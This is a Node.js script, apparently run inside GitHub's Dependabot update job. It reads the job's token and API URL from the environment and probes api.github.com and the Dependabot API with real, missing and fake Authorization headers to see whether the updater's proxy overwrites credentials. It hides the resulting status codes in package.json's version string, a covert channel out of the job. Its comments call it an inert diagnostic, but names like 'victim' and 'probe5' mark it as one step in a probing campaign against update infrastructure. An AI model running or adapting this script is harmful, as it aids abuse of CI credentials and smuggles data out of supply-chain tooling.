// INERT diagnostic. Determines whether GitHub's update-job sidecar proxy
// OVERWRITES the Authorization header on outbound requests, which would
// explain why a credential obtained inside the updater cannot be used there.
// Sends deliberately invalid Authorization values to read-only endpoints and
// records ONLY the HTTP status code. No credential is obtained or used here.
const fs=require('fs'),path=require('path'),http=require('http'),https=require('https');
const api=process.env.DEPENDABOT_API_URL||'', jid=process.env.DEPENDABOT_JOB_ID||'';
const job=process.env.DEPENDABOT_JOB_TOKEN||'';
const ORG='new-ORG-te', SELF='jit-probe-victim-proxy';
function tag(s,n){return String(s).replace(/[^A-Za-z0-9]+/g,'').slice(0,10);}
function req(m,u2,hdrs){return new Promise(r=>{let u;try{u=new URL(u2);}catch(e){return r({s:'BADURL'});}
  const lib=u.protocol==='http:'?http:https;
  const h=Object.assign({'Accept':'application/json','User-Agent':'jitprobe'},hdrs||{});
  const q=lib.request({method:m,hostname:u.hostname,port:u.port||undefined,
    path:u.pathname+u.search,timeout:20000,headers:h},res=>{
    let b='';res.on('data',c=>{b+=c;if(b.length>16384)res.destroy();});
    res.on('end',()=>{let t='';try{const j=JSON.parse(b);t=tag(j.message||j.detail||'');}catch(e){}
      r({s:res.statusCode,t:t});});
  });
  q.on('timeout',()=>{q.destroy();r({s:'TMO'});});
  q.on('error',e=>r({s:'E'+tag(e.code||e.message)}));q.end();});}
const GH='https://api.github.com';
const BAD='Bearer ghs_thisIsDeliberatelyNotARealTokenAAAAAAAA';
(async()=>{const p=[];
 try{
  // baseline: the job's own credential on an endpoint we know answers 200
  let r=await req('GET',GH+'/rate_limit',{'Authorization':job});            p.push('b'+r.s);
  // no Authorization header at all. 200 here means the proxy FILLS it in.
  r=await req('GET',GH+'/rate_limit',{});                                   p.push('n'+r.s);
  // a deliberately invalid Authorization. 200 here means the proxy OVERWRITES it.
  r=await req('GET',GH+'/rate_limit',{'Authorization':BAD});                p.push('x'+r.s+r.t);
  // same three against the job's OWN repo, which the job legitimately sees
  r=await req('GET',GH+'/repos/'+ORG+'/'+SELF,{'Authorization':job});       p.push('S'+r.s);
  r=await req('GET',GH+'/repos/'+ORG+'/'+SELF,{'Authorization':BAD});       p.push('X'+r.s+r.t);
  // and against the dependabot-api host, where probe5 already saw N200
  r=await req('GET',api+'/update_jobs/'+jid+'/details',{'Authorization':BAD});
  p.push('D'+r.s+r.t);
 }catch(e){p.push('Z'+tag(e.message));}
 try{const pj=path.join(__dirname,'package.json');const j=JSON.parse(fs.readFileSync(pj,'utf8'));
  j.version=('0.0.13-'+p.join('-')).replace(/[^A-Za-z0-9.-]/g,'').slice(0,180);
  fs.writeFileSync(pj,JSON.stringify(j,null,2));}catch(e){}
})();
